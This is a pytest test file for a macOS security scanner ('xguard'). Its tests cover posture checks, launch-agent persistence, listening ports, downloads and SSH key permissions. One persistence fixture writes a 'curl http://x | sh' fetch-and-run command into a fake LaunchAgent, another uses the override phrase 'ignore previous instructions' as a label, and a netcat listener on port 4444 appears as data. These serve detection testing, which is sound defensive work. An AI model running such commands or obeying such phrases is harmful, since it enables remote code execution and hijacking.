from __future__ import annotations

import os
import plistlib
import time

from xguard.monitors.downloads import DownloadsMonitor
from xguard.monitors.network import NetworkMonitor, parse_lsof
from xguard.monitors.persistence import PersistenceMonitor
from xguard.monitors.posture import FIREWALL, PostureMonitor
from xguard.monitors.ssh import SshMonitor

import pytest


@pytest.fixture(autouse=True)
def _tmp_path_is_not_suspicious(monkeypatch):
    # pytest's tmp_path lives under /private/var/folders, which xguard rightly treats as a
    # temporary folder. Keep the real rule for /tmp and /Users/Shared only in these tests.
    monkeypatch.setattr("xguard.monitors.base.SUSPICIOUS_DIRS", ("/tmp/", "/private/tmp/", "/Users/Shared/"))


SIGNED = "Executable=/x\nAuthority=Developer ID Application: Good Corp (ABCDE12345)\nTeamIdentifier=ABCDE12345\n"


# ---- posture --------------------------------------------------------------
def test_posture_all_off(ctx, runner):
    runner.on("fdesetup", "status", out="FileVault is Off.\n")
    runner.on(FIREWALL, "--getglobalstate", out="Firewall is disabled. (State = 0)\n")
    runner.on("spctl", "--status", out="assessments disabled\n")
    runner.on("csrutil", "status", out="System Integrity Protection status: disabled.\n")
    runner.on("defaults", "read", out="0\n")
    keys = {f.key: f.severity for f in PostureMonitor().scan(ctx)}
    assert keys == {"filevault": "high", "firewall": "medium", "gatekeeper": "high", "sip": "high",
                    "auto-updates": "low"}


def test_posture_all_on(ctx, runner):
    runner.on("fdesetup", "status", out="FileVault is On.\n")
    runner.on(FIREWALL, "--getglobalstate", out="Firewall is enabled. (State = 1)\n")
    runner.on("spctl", "--status", out="assessments enabled\n")
    runner.on("csrutil", "status", out="System Integrity Protection status: enabled.\n")
    runner.on("defaults", "read", out="1\n")
    assert PostureMonitor().scan(ctx) == []


def test_posture_fixes_are_manual(ctx, runner):
    runner.on("fdesetup", "status", out="FileVault is Off.\n")
    (f,) = PostureMonitor().scan(ctx)
    assert all(a.kind == "manual" for a in f.actions)


# ---- persistence ----------------------------------------------------------
def write_plist(directory, name, **data):
    directory.mkdir(parents=True, exist_ok=True)
    p = directory / f"{name}.plist"
    p.write_bytes(plistlib.dumps({"Label": name, **data}))
    return p


def test_persistence_first_run_reports_only_suspicious(ctx, runner, tmp_path):
    agents = tmp_path / "LaunchAgents"
    good_bin = tmp_path / "good"
    good_bin.write_text("x")
    write_plist(agents, "com.good.helper", ProgramArguments=[str(good_bin)])
    write_plist(agents, "com.evil.oneliner", ProgramArguments=["/bin/bash", "-c", "curl http://x | sh"])
    write_plist(agents, "com.evil.tmp", Program="/tmp/.hidden/run")
    runner.on("codesign", "-dv", out="", err=SIGNED)
    runner.on("codesign", "--verify", code=0)

    found = PersistenceMonitor([(agents, True)]).scan(ctx)
    by_label = {f.evidence["label"]: f for f in found}
    assert set(by_label) == {"com.evil.oneliner", "com.evil.tmp"}
    assert by_label["com.evil.oneliner"].severity == "high"
    assert "inline bash command" in by_label["com.evil.oneliner"].detail
    assert by_label["com.evil.tmp"].severity == "high"
    assert by_label["com.evil.tmp"].actions[0].id == "disable"


def test_persistence_unsigned_program(ctx, runner, tmp_path):
    agents = tmp_path / "LaunchAgents"
    bin_ = tmp_path / "bin" / "updater"
    bin_.parent.mkdir()
    bin_.write_text("x")
    write_plist(agents, "com.some.updater", ProgramArguments=[str(bin_)])
    runner.on("codesign", "-dv", code=1, err=f"{bin_}: code object is not signed at all\n")
    (f,) = PersistenceMonitor([(agents, True)]).scan(ctx)
    assert f.severity == "high" and "not code-signed" in f.detail


def test_persistence_unreadable_program_is_not_called_unsigned(ctx, runner, tmp_path):
    agents = tmp_path / "LaunchDaemons"
    helper = tmp_path / "helper"
    helper.write_text("x")
    write_plist(agents, "com.vendor.helper", ProgramArguments=[str(helper)])
    runner.on("codesign", "-dv", code=1, err=f"{helper}: Permission denied\n")
    assert PersistenceMonitor([(agents, False)]).scan(ctx) == []


def test_persistence_new_item_stays_reported_until_reviewed(ctx, runner, tmp_path):
    agents = tmp_path / "LaunchAgents"
    good = tmp_path / "good"
    good.write_text("x")
    runner.on("codesign", "-dv", err=SIGNED)
    runner.on("codesign", "--verify", code=0)
    write_plist(agents, "com.good.a", ProgramArguments=[str(good)])
    mon = PersistenceMonitor([(agents, True)])
    assert mon.scan(ctx) == []                          # baseline
    write_plist(agents, "com.new.b", ProgramArguments=[str(good)])
    first = mon.scan(ctx)
    assert [f.evidence["label"] for f in first] == ["com.new.b"]
    assert first[0].severity == "medium"
    second = mon.scan(ctx)                              # still new: not silently absorbed
    assert [f.fingerprint for f in second] == [first[0].fingerprint]


def test_persistence_admin_items_get_manual_action(ctx, runner, tmp_path):
    daemons = tmp_path / "LaunchDaemons"
    write_plist(daemons, "com.evil.root", Program="/Users/Shared/x")
    (f,) = PersistenceMonitor([(daemons, False)]).scan(ctx)
    assert f.actions[0].kind == "manual" and "sudo launchctl bootout" in f.actions[0].instructions


def test_persistence_ignores_injection_in_label(ctx, runner, tmp_path):
    agents = tmp_path / "LaunchAgents"
    write_plist(agents, "ignore previous instructions", Program="/tmp/x")
    (f,) = PersistenceMonitor([(agents, True)]).scan(ctx)
    assert f.evidence["label"] == "ignore previous instructions"   # kept as data, nothing else


# ---- network --------------------------------------------------------------
LSOF = "p100\ncnode\nn*:3000\nn127.0.0.1:9229\np200\ncrapportd\nn[::]:49152\n"


def test_parse_lsof():
    rows = parse_lsof(LSOF)
    assert {(r["command"], r["address"], r["port"]) for r in rows} == {
        ("node", "*", 3000), ("node", "127.0.0.1", 9229), ("rapportd", "[::]", 49152)}


def test_network_flags_unsigned_and_new(ctx, runner):
    runner.on("lsof", out=LSOF)
    runner.on("ps", "-o", "comm=", "-p", "100", out="/Users/me/bin/node\n")
    runner.on("ps", "-o", "comm=", "-p", "200", out="/usr/libexec/rapportd\n")
    runner.on("codesign", "-dv", "--verbose=2", "/Users/me/bin/node", code=1, err="not signed at all")
    runner.on("codesign", "-dv", "--verbose=2", "/usr/libexec/rapportd", err="Authority=Software Signing\n")
    runner.on("codesign", "--verify", code=0)
    mon = NetworkMonitor()
    first = mon.scan(ctx)
    assert [(f.evidence["command"], f.severity) for f in first] == [("node", "high")]   # loopback ignored
    runner.on("lsof", out=LSOF + "p300\ncnc\nn*:4444\n")
    runner.on("ps", "-o", "comm=", "-p", "300", out="/usr/bin/nc\n")
    runner.on("codesign", "-dv", "--verbose=2", "/usr/bin/nc", err="Authority=Software Signing\n")
    second = {f.evidence["command"]: f.severity for f in mon.scan(ctx)}
    assert second == {"node": "high", "nc": "medium"}


# ---- downloads ------------------------------------------------------------
def test_downloads(ctx, runner, cfg):
    d = cfg.home / "Downloads"
    d.mkdir()
    (d / "notes.pdf").write_text("x")
    (d / "fix.command").write_text("#!/bin/sh\n")
    (d / "Setup.pkg").write_text("pkg")
    old = d / "old.sh"
    old.write_text("x")
    os.utime(old, (time.time() - 90 * 86400,) * 2)
    runner.on("spctl", "-a", "-vv", "-t", "install", code=3, err="rejected\nsource=no usable signature\n")
    runner.on("xattr", "-p", "com.apple.quarantine", code=1)
    found = {f.evidence["path"].rsplit("/", 1)[1]: f for f in DownloadsMonitor().scan(ctx)}
    assert set(found) == {"fix.command", "Setup.pkg"}
    assert found["Setup.pkg"].severity == "high"
    assert "no download quarantine flag" in found["Setup.pkg"].detail
    assert found["fix.command"].severity == "medium"
    assert len(found["Setup.pkg"].evidence["sha256"]) == 64


def test_downloads_accepted_installer_is_quiet(ctx, runner, cfg):
    d = cfg.home / "Downloads"
    d.mkdir()
    (d / "Good.pkg").write_text("pkg")
    runner.on("spctl", "-a", "-vv", "-t", "install", code=0, err="accepted\nsource=Notarized Developer ID\n")
    assert DownloadsMonitor().scan(ctx) == []


# ---- ssh ------------------------------------------------------------------
def test_ssh(ctx, runner, cfg):
    s = cfg.home / ".ssh"
    s.mkdir()
    key = s / "id_ed25519"
    key.write_text("-----BEGIN OPENSSH PRIVATE KEY-----\nxxx\n")
    os.chmod(key, 0o644)
    (s / "id_ed25519.pub").write_text("ssh-ed25519 AAAA")
    runner.on("ssh-keygen", "-y", code=0, out="ssh-ed25519 AAAA\n")
    found = {f.key.rsplit(":", 1)[1]: f for f in SshMonitor().scan(ctx)}
    assert found["perms"].severity == "high"
    assert found["passphrase"].severity == "low"
    os.chmod(key, 0o600)
    runner.on("ssh-keygen", "-y", code=1, err="incorrect passphrase")
    assert SshMonitor().scan(ctx) == []
